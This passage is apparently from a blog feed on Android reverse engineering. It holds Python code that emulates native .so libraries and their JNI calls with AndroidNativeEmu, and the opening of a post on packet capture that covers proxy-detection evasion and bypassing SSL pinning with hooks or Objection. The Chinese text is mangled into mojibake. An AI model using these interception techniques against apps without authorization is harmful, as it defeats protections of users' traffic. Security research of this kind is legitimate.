class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> UC_HOOK_CODE</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> androidemu.emulator <span class="keyword">import</span> Emulator</span><br><span class="line"></span><br><span class="line"><span class="comment">#add</span></span><br><span class="line"><span class="keyword">from</span> examples <span class="keyword">import</span> debug_utils</span><br><span class="line"><span class="keyword">from</span> androidemu.utils <span class="keyword">import</span> memory_helpers  <span class="comment">#å®ç°æ‰“å°å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">from</span> androidemu.java.helpers.native_method <span class="keyword">import</span> native_method, native_read_args <span class="comment">#@native_methodæ ‡ç­¾</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> UcError, UC_HOOK_CODE, UC_HOOK_MEM_UNMAPPED</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> androidemu.emulator <span class="keyword">import</span> Emulator</span><br><span class="line"><span class="keyword">from</span> androidemu.java.java_class_def <span class="keyword">import</span> JavaClassDef</span><br><span class="line"><span class="keyword">from</span> androidemu.java.java_method_def <span class="keyword">import</span> java_method_def</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> debug_utils</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create java class.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span>(metaclass=JavaClassDef, jvm_name=<span class="string">&quot;com/example/unicorncourse05/MainActivity&quot;</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @java_method_def(<span class="params">name=<span class="string">&#x27;stringFromJNI&#x27;</span>, signature=<span class="string">&#x27;(Ljava/lang/String;)Ljava/lang/String;&#x27;</span>, native=<span class="literal">True</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stringFromJNI</span>(<span class="params">self, uc,arg0</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment">#add</span></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strlen</span>(<span class="params">uc,buffer</span>): <span class="comment">#ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">    content=memory_helpers.read_utf8(uc,buffer)</span><br><span class="line">    length=<span class="built_in">len</span>(content)</span><br><span class="line">    <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_Z4testv</span>(<span class="params">uc</span>): <span class="comment">#æ²¡æœ‰å‚æ•°</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">666</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure logging</span></span><br><span class="line">logging.basicConfig(</span><br><span class="line">    stream=sys.stdout,</span><br><span class="line">    level=logging.DEBUG,</span><br><span class="line">    <span class="built_in">format</span>=<span class="string">&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize emulator</span></span><br><span class="line">emulator = Emulator(vfp_inst_set=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">lib_module = emulator.load_library(<span class="string">&quot;unicorncourse/unicorncourse07.so&quot;</span>, do_init=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show loaded modules.</span></span><br><span class="line">logger.info(<span class="string">&quot;Loaded modules:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> emulator.modules:</span><br><span class="line">    logger.info(<span class="string">&quot;[0x%x] %s&quot;</span> % (module.base, module.filename))</span><br><span class="line"></span><br><span class="line">emulator.uc.hook_add(UC_HOOK_CODE, debug_utils.hook_code)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¸¤ç§è°ƒç”¨æ–¹å¼ï¼Œç±»æ¯”frida</span></span><br><span class="line">emulator.java_classloader.add_class(MainActivity)  <span class="comment">#æ¨¡æ‹Ÿå™¨æ³¨å†Œ  åŠ è½½ç±»</span></span><br><span class="line"><span class="comment">#JNIOnLodaä¸­è¿›è¡ŒåŠ¨æ€æ³¨å†Œ</span></span><br><span class="line">emulator.call_symbol(lib_module, <span class="string">&#x27;JNI_OnLoad&#x27;</span>, emulator.java_vm.address_ptr, <span class="number">0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ©ç”¨åŠ¨æ€æ³¨å†Œåœ°å€è°ƒç”¨Jniå‡½æ•° æ–¹æ³•ä¸€</span></span><br><span class="line">address=<span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> method <span class="keyword">in</span> MainActivity.jvm_methods.values():</span><br><span class="line">    <span class="keyword">if</span> method.name==<span class="string">&quot;stringFromJNI&quot;</span>:</span><br><span class="line">        address=method.native_addr  <span class="comment">#è·å–æŒ‡å®šå‡½æ•°æ³¨å†Œåœ°å€</span></span><br><span class="line">    logger.info(<span class="string">&quot;Registered JNI method--&gt;name:&quot;</span>+method.name+<span class="string">&quot;--signature:&quot;</span>+method.signature+<span class="string">&quot;--address&quot;</span>+method.native_addr)</span><br><span class="line">result=emulator.call_native(address,emulator.java_vm.jni_env.address_ptr,<span class="number">0</span>,<span class="string">&#x27;i am from python&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment">#å®ä¾‹è°ƒç”¨jniå‡½æ•° æ–¹æ³•äºŒ</span></span><br><span class="line"><span class="comment">#mainactivity=MainActivity()#åˆ›å»ºå®ä¾‹</span></span><br><span class="line"><span class="comment">#result=mainactivity.stringFromJNI(emulator,&#x27;i am from python&#x27;) #è°ƒç”¨å®ä¾‹ä¸‹é¢çš„å‡½æ•°</span></span><br><span class="line"><span class="comment">#print(result)</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">#jniå‡½æ•°ä¸­å‡ºç°å¯¹javaå‡½æ•°çš„è°ƒç”¨</span></span><br></pre></td></tr></table></figure><p>AndroidNativeEmuæ¨¡æ‹Ÿä¸javaå‡½æ•°äº¤äº’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> UC_HOOK_CODE</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> androidemu.emulator <span class="keyword">import</span> Emulator</span><br><span class="line"></span><br><span class="line"><span class="comment">#add</span></span><br><span class="line"><span class="keyword">from</span> examples <span class="keyword">import</span> debug_utils</span><br><span class="line"><span class="keyword">from</span> androidemu.utils <span class="keyword">import</span> memory_helpers  <span class="comment">#å®ç°æ‰“å°å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">from</span> androidemu.java.helpers.native_method <span class="keyword">import</span> native_method, native_read_args <span class="comment">#@native_methodæ ‡ç­¾</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> UcError, UC_HOOK_CODE, UC_HOOK_MEM_UNMAPPED</span><br><span class="line"><span class="keyword">from</span> unicorn.arm_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> androidemu.emulator <span class="keyword">import</span> Emulator</span><br><span class="line"><span class="keyword">from</span> androidemu.java.java_class_def <span class="keyword">import</span> JavaClassDef</span><br><span class="line"><span class="keyword">from</span> androidemu.java.java_method_def <span class="keyword">import</span> java_method_def</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> debug_utils</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create java class.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span>(metaclass=JavaClassDef, jvm_name=<span class="string">&quot;com/example/unicorncourse05/MainActivity&quot;</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="meta">    @java_method_def(<span class="params">name=<span class="string">&#x27;stringFromJNI&#x27;</span>,signature=<span class="string">&#x27;(Ljava/lang/String;)Ljava/lang/String;&#x27;</span>, native=<span class="literal">True</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stringFromJNI</span>(<span class="params">self, uc,arg0</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#javaå‡½æ•° éœ€è¦æŒ‡å®šå‚æ•°ç±»å‹ args_list</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Encrypt</span>(metaclass=JavaClassDef, jvm_name=<span class="string">&quot;com/example/unicorncourse05/Encrypt&quot;</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="meta">    @java_method_def(<span class="params">name=<span class="string">&#x27;base64&#x27;</span>,  args_list=[<span class="string">&#x27;jstring&#x27;</span>],signature=<span class="string">&#x27;(Ljava/lang/String;)Ljava/lang/String;&#x27;</span>, native=<span class="literal">False</span></span>) </span><span class="comment">#ä¸æ˜¯jniå‡½æ•° nativeæ˜¯false</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">base64</span>(<span class="params">self,*args, **kwargs</span>):  <span class="comment">#é€šè¿‡argsæ‰“å°å‚æ•°</span></span><br><span class="line">        content=args[<span class="number">0</span>].value</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;base64 is called--&gt;&quot;</span>+content)</span><br><span class="line">        <span class="keyword">import</span> base64</span><br><span class="line">        encodestr=content.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        result=base64.b64encode(encodestr)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(result,<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment">#bytes --&gt; str</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add</span></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strlen</span>(<span class="params">uc,buffer</span>): <span class="comment">#ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">    content=memory_helpers.read_utf8(uc,buffer)</span><br><span class="line">    length=<span class="built_in">len</span>(content)</span><br><span class="line">    <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line"><span class="meta">@native_method</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_Z4testv</span>(<span class="params">uc</span>): <span class="comment">#æ²¡æœ‰å‚æ•°</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">666</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure logging</span></span><br><span class="line">logging.basicConfig(</span><br><span class="line">    stream=sys.stdout,</span><br><span class="line">    level=logging.DEBUG,</span><br><span class="line">    <span class="built_in">format</span>=<span class="string">&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize emulator</span></span><br><span class="line">emulator = Emulator(vfp_inst_set=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">lib_module = emulator.load_library(<span class="string">&quot;unicorncourse/calljava.so&quot;</span>, do_init=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show loaded modules.</span></span><br><span class="line">logger.info(<span class="string">&quot;Loaded modules:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> emulator.modules:</span><br><span class="line">    logger.info(<span class="string">&quot;[0x%x] %s&quot;</span> % (module.base, module.filename))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">emulator.uc.hook_add(UC_HOOK_CODE, debug_utils.hook_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¸¤ç§è°ƒç”¨æ–¹å¼ï¼Œç±»æ¯”frida</span></span><br><span class="line">emulator.java_classloader.add_class(Encrypt)  <span class="comment">#æ¨¡æ‹Ÿå™¨æ³¨å†Œ  åŠ è½½ç±»</span></span><br><span class="line">emulator.java_classloader.add_class(MainActivity)  <span class="comment">#æ¨¡æ‹Ÿå™¨æ³¨å†Œ  åŠ è½½ç±»</span></span><br><span class="line">emulator.call_symbol(lib_module, <span class="string">&#x27;JNI_OnLoad&#x27;</span>, emulator.java_vm.address_ptr, <span class="number">0</span>) <span class="comment">#JNIOnLodaä¸­è¿›è¡ŒåŠ¨æ€æ³¨å†Œ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#åˆ©ç”¨åŠ¨æ€æ³¨å†Œåœ°å€è°ƒç”¨Jniå‡½æ•° æ–¹æ³•ä¸€</span></span><br><span class="line">address=<span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> method <span class="keyword">in</span> MainActivity.jvm_methods.values():</span><br><span class="line">    <span class="keyword">if</span> method.name==<span class="string">&quot;stringFromJNI&quot;</span>:</span><br><span class="line">        address=method.native_addr  <span class="comment">#è·å–æ³¨å†Œåœ°å€</span></span><br><span class="line">    logger.info(<span class="string">&quot;Registered JNI method--&gt;name:&quot;</span>+method.name+<span class="string">&quot;--signature:&quot;</span>+method.signature+<span class="string">&quot;--address&quot;</span>+method.native_addr)</span><br><span class="line">result=emulator.call_native(address,emulator.java_vm.jni_env.address_ptr,<span class="number">0</span>,<span class="string">&#x27;i am from python&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment">#å®ä¾‹è°ƒç”¨jniå‡½æ•° æ–¹æ³•äºŒ</span></span><br><span class="line">mainactivity=MainActivity()<span class="comment">#åˆ›å»ºå®ä¾‹</span></span><br><span class="line">result=mainactivity.stringFromJNI(emulator,<span class="string">&#x27;i am from python&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"> <span class="comment">#jniå‡½æ•°ä¸­å‡ºç°å¯¹javaå‡½æ•°çš„è°ƒç”¨</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">â™¥UnidbgåŸºæœ¬æ“ä½œçš„æ•´ç†ä¸å½’çº³</summary>
    
    
    
    <category term="Androidé€†å‘" scheme="https://zxk1ng.github.io/categories/Android%E9%80%86%E5%90%91/"/>
    
    
    <category term="Androidé€†å‘" scheme="https://zxk1ng.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
    <category term="Unidbg" scheme="https://zxk1ng.github.io/tags/Unidbg/"/>
    
    <category term="æ¨¡æ‹Ÿæ‰§è¡Œ" scheme="https://zxk1ng.github.io/tags/%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>AndroidæŠ“åŒ…</title>
    <link href="https://zxk1ng.github.io/posts/be4930f3.html"/>
    <id>https://zxk1ng.github.io/posts/be4930f3.html</id>
    <published>2025-01-15T07:02:38.000Z</published>
    <updated>2025-01-15T07:14:39.047Z</updated>
    
    <content type="html"><![CDATA[<h1>AndroidæŠ“åŒ…</h1><p>æŠ“åŒ…å·¥å…·ï¼š</p><ul><li>Packet Captureï¼šæ— éœ€rootï¼ŒåŸºäºæœ¬åœ°VPNå®ç°çš„æŠ“åŒ…ï¼Œå¯ä»¥æ”¯æŒTCPåŠä»¥ä¸Šå±‚çš„æ¶ˆæ¯æ•è·ã€‚</li></ul><p><a href="https://www.anquanke.com/post/id/197657#h3-10">å®ç”¨FRIDAè¿›é˜¶ï¼šå†…å­˜æ¼«æ¸¸ã€hook anywhereã€æŠ“åŒ…-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1967845">ã€Šå®‰å“é€†å‘è¿™æ¡£äº‹ã€‹ç¬¬äºŒåä¸€è¯¾ã€æŠ“åŒ…å­¦å¾—å¥½ï¼Œç‰¢é¥­åƒå¾—é¥±(ä¸­) - å¾çˆ±ç ´è§£ - 52pojie.cn</a></p><h2 id="Httpå’ŒHttps">Httpå’ŒHttps</h2><p><strong>Http</strong>ï¼šæ˜¯ä¸€ç§åº”ç”¨å±‚åè®®ï¼Œç”¨äºä¼ è¾“è¶…æ–‡æœ¬ï¼Œå¦‚htmlæ–‡æ¡£ï¼Œä»¥åŠå…¶ä»–èµ„æºï¼Œå¦‚å›¾åƒå’Œè§†é¢‘ã€‚ä»–æ˜¯ä¸€ç§æ— çŠ¶æ€çš„åè®®ï¼Œè¿™å°±æ„å‘³ç€æ¯ä¸ªè¯·æ±‚éƒ½æ˜¯ç‹¬ç«‹çš„ï¼ŒæœåŠ¡å™¨ä¸ä¼šä¿å­˜æœ‰å…³å®¢æˆ·ç«¯çš„ä»»ä½•ä¿¡æ¯ã€‚HTTPå·¥ä½œåœ¨TCP/IPåè®®æ ˆçš„åº”ç”¨å±‚ï¼Œä½¿ç”¨TCPç«¯å£80è¿›è¡Œé€šä¿¡</p><p><strong>HTTPS</strong>ï¼šæ˜¯httpçš„å®‰å…¨ç‰ˆæœ¬ï¼Œä»–é€šè¿‡SSL/TLSåè®®å¯¹httpè¿›è¡ŒåŠ å¯†ï¼ŒSSL/TLSæä¾›åŠ å¯†æ•°æ®ï¼Œèº«ä»½éªŒè¯ï¼Œå’Œæ•°æ®å®Œæ•´æ€§çš„ä¿æŠ¤ï¼Œç¡®ä¿æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­çš„å®‰å…¨ã€‚HTTPSä½¿ç”¨443ç«¯é€šä¿¡ï¼ŒHTTPSå¹¶éä¸€ç§æ–°åè®®ã€‚åªæ˜¯httpé€šä¿¡æ¥å£éƒ¨åˆ†ç”¨SSLå’ŒTLSåè®®ä»£æ›¿ã€‚</p><p><strong>HTTPæ–¹æ³•</strong></p><p><img src="/posts/be4930f3.htm/image-20241019230748809.png" alt="image-20241019230748809"></p><p><strong>HTTPå¸¸è§çŠ¶æ€ç </strong></p><p><img src="/posts/be4930f3.htm/image-20241019230826536.png" alt="image-20241019230826536"></p><h2 id="æŠ“åŒ…ä»‹ç»">æŠ“åŒ…ä»‹ç»</h2><p>æŠ“åŒ…ä¸€èˆ¬åˆ†ä¸ºä¸¤ç§æƒ…å½¢ï¼š</p><p>åº”ç”¨å±‚ï¼šHttp(s)åè®®æŠ“åŒ…</p><p>ä¼šè¯å±‚ï¼šSocketç«¯å£é€šä¿¡æŠ“åŒ…</p><ul><li>HookæŠ“åŒ…ï¼šé€šè¿‡å¯¹å‘åŒ…å‡½æ•°çš„Hookæ¥è¾¾åˆ°æŠ“åŒ…çš„ç›®çš„</li><li>ä¸­é—´äººæŠ“åŒ…ï¼šå°†åŸæ¥ä¸€æ®µå®Œæ•´çš„å®¢æˆ·ç«¯-æœåŠ¡ç«¯çš„é€šä¿¡æ–¹å¼å‰²è£‚æˆä¸¤æ®µå®¢æˆ·ç«¯-æœåŠ¡ç«¯çš„é€šä¿¡ï¼Œä¸­é—´äººæŠ“åŒ…åœ¨OSIæ¨¡å‹ç»“æ„åˆåˆ†ä¸º ===&gt; åº”ç”¨å±‚ï¼šHttp(s)åè®®æŠ“åŒ…   ä¼šè¯å±‚ï¼šSocketé€šä¿¡æŠ“åŒ…</li></ul><p>å¦‚æœè¿›è¡Œåº”ç”¨å±‚åè®®æŠ“åŒ…ï¼Œå¯ä»¥ä½¿ç”¨Burpsuiteæˆ–è€…Charlesï¼Œä¸å»ºè®®ä½¿ç”¨Fiddlerï¼Œå› ä¸ºå…¶æ— æ³•å¯¼å…¥å®¢æˆ·ç«¯è¯ä¹¦ï¼Œåœ¨æœåŠ¡å™¨æ ¡éªŒå®¢æˆ·ç«¯è¯ä¹¦æ—¶æ— é€šè¿‡ã€‚å¦‚æœæ˜¯ä¼šè¯å±‚æŠ“åŒ…ï¼Œåˆ™é€‰æ‹©<code>tcpdump</code>å’Œ<code>WireShark</code>ç›¸ç»„åˆçš„æ–¹å¼ã€‚</p><p>ä½¿ç”¨<code>jnettop</code>è¿˜å¯ä»¥å®æ—¶æŸ¥çœ‹æµé‡èµ°åŠ¿å’Œå¯¹æ–¹<code>IP</code>åœ°å€ï¼Œæ›´ä¸ºç›´è§‚å’Œç”ŸåŠ¨ã€‚</p><p>å¯¹äºå®‰å“åº”ç”¨æ¥è¯´ï¼Œ<code>Socket</code>é€šä¿¡å¤©ç”Ÿåˆåˆ†ä¸ºä¸¤ç§<code>Java</code>å±‚<code>Socket</code>é€šä¿¡å’Œ<code>Native</code>å±‚<code>Socket</code>é€šä¿¡ã€‚</p><ul><li><code>Java</code>å±‚ï¼šä½¿ç”¨çš„æ˜¯<code>java.net.InetAddress</code>ã€<code>java.net.Socket</code>ã€<code>java.net.ServerSocket</code>ç­‰ç±»ï¼Œä¸è¯ä¹¦ç»‘å®šçš„æƒ…å½¢ç±»ä¼¼ï¼Œä¹Ÿå¯èƒ½å­˜åœ¨ç€è‡ªå®šä¹‰æ¡†æ¶çš„<code>Socket</code>é€šä¿¡ï¼Œè¿™æ—¶å€™å°±éœ€è¦å…·ä½“æƒ…å†µå…·ä½“åˆ†æï¼Œæ¯”å¦‚è°·æ­Œçš„<code>protobuf</code>æ¡†æ¶ç­‰ï¼›</li><li><code>Native</code>å±‚ï¼šä¸€èˆ¬ä½¿ç”¨çš„æ˜¯<code>C Socket API</code>ï¼Œä¸€èˆ¬<code>hook</code>ä½<code>send()</code>å’Œ<code>recv()</code>å‡½æ•°å¯ä»¥å¾—åˆ°å…¶å‘é€å’Œæ¥å—çš„å†…å®¹</li></ul><p><strong>Socketé€šä¿¡çš„ä¸€äº›å…³é”®å‡½æ•°</strong></p><p>Httpï¼šjava.net.SocketOutputStreamçš„socketWriteæ–¹æ³•å’Œjava.net.SocketInputStreamçš„readæ–¹æ³•</p><p>Https:com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream.write([B,int,int)<br>å’Œcom.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream.read([B,int, int)ï¼Œ</p><p>å¹¶ä¸”å®ƒä»¬çš„ç¬¬ä¸€ä¸ªå‚æ•°æ°¸è¿œæ˜¯æ˜æ–‡çš„requestæˆ–è€…responseæ•°æ®ã€‚</p><h2 id="ç¯å¢ƒé…ç½®">ç¯å¢ƒé…ç½®</h2><p>ä¿è¯ä¸»æœºå’Œæ‰‹æœºåœ¨ä¸€ä¸ªå±€åŸŸç½‘å†…ï¼Œå¹¶ä¸”ç»™æ‰‹æœºè¿›è¡Œä»£ç†è®¾ç½®ï¼Œå¯ä»¥é•¿æŒ‰WLANæ‰‹åŠ¨ä»£ç†ï¼Œä»£ç†æœåŠ¡å™¨åœ°å€ä¸ºä¸»æœºçš„ipå’Œç«¯å£ã€‚è¿™æ ·å®¹æ˜“è¢«ä¸‹é¢çš„ä»£ç æ£€æµ‹</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.getProperty(<span class="string">&quot;http.proxyHost&quot;</span>)<span class="comment">;</span></span><br><span class="line">System.getProperty(<span class="string">&quot;http.proxyProt&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æœ€å¥½é‡‡ç”¨VPNä»£ç†ï¼Œé‡‡ç”¨å·¥å…·Posternè¿›è¡Œé…ç½®ã€‚æ³¨æ„ç›®æ ‡åœ°å€è®¾ç½®ä¸º â€˜*â€™ æŒ‡å®šæ‰€æœ‰æ‰‹æœºæµé‡ä»ä»£ç†ç»è¿‡</p><p>å½“å¯¹Charlesè¿›è¡ŒhttpæŠ“åŒ…æ—¶ï¼Œéœ€è¦å…³é—­SSLæ¨¡å¼(å¿«æ·é”® ctrl+L)å’ŒEnable SOCKS proxyï¼Œä¸”æŠ“ httpsæ•°æ®æ˜¯ä¹±ç ã€‚</p><p>è¿™é‡Œhttpsé…ç½®ä¸åœ¨èµ˜è¿°</p><h2 id="ä¸­é—´äººæŠ“åŒ…å¯¹æŠ—">ä¸­é—´äººæŠ“åŒ…å¯¹æŠ—</h2><h3 id="SSL-pinning">SSL pinning</h3><p><img src="/posts/be4930f3.htm/3e7d68353ecaa9c62720955d1d230ea61665.png" alt="å›¾ç‰‡"></p><p><strong>SSL Pining</strong>ï¼šåˆç§°è¯ä¹¦ç»‘å®šï¼Œå¯ä»¥è¯´æ˜¯å®¢æˆ·ç«¯æ ¡éªŒæœåŠ¡å™¨çš„è¿›é˜¶ç‰ˆï¼Œè¯¥æ–¹å¼ä¸ä»…æ ¡éªŒæœåŠ¡å™¨è¯ä¹¦æ˜¯å¦æ˜¯ç³»ç»Ÿä¸­çš„å¯ä¿¡å‡­è¯ï¼Œåœ¨é€šä¿¡è¿‡ç¨‹ä¸­ç”šè‡³è¿ç³»ç»Ÿå†…ç½®çš„è¯ä¹¦éƒ½ä¸ä¿¡ä»»è€Œåªä¿¡ä»»appæŒ‡å®šçš„è¯ä¹¦ã€‚ä¸€æ—¦å‘ç°æœåŠ¡å™¨è¯ä¹¦ä¸ºéæŒ‡å®šè¯ä¹¦å³ç«‹åˆ»åœæ­¢é€šä¿¡ï¼Œæœ€ç»ˆå¯¼è‡´å³ä½¿å°†Charlesè¯ä¹¦å®‰è£…åˆ°ç³»ç»Ÿä¿¡ä»»å‡­æ®ä¸­ä¹Ÿæ— æ³•ç”Ÿæ•ˆã€‚</p><p>æœåŠ¡å™¨æ ¡éªŒå®¢æˆ·ç«¯ï¼šè¿™ç§æ–¹å¼å‘ç”Ÿåœ¨httpséªŒè¯èº«ä»½é˜¶æ®µï¼ŒæœåŠ¡å™¨åœ¨æ¥æ”¶åˆ°å®¢æˆ·ç«¯çš„å…¬é’¥åï¼Œå†å‘é€session keyä¹‹å‰å…ˆå¯¹å®¢æˆ·ç«¯çš„å…¬é’¥è¿›è¡ŒéªŒè¯ï¼Œå¦‚æœä¸æ˜¯ä¿¡ä»»è¯ä¹¦çš„å…¬é’¥ï¼ŒæœåŠ¡å™¨å°±ç»ˆæ­¢å’Œå®¢æˆ·ç«¯çš„é€šä¿¡ã€‚</p><p>ç”±äºssl piningæ˜¯åœ¨appä»£ç å†…å®ç°çš„æ‰€æœ‰å¯ä»¥é€šè¿‡hookæ¥ç»•è¿‡ã€‚Objectionæœ¬èº«å¯ä»¥å®ŒæˆSSL Pining Bypassçš„åŠŸèƒ½</p><p><code>android sslpinning 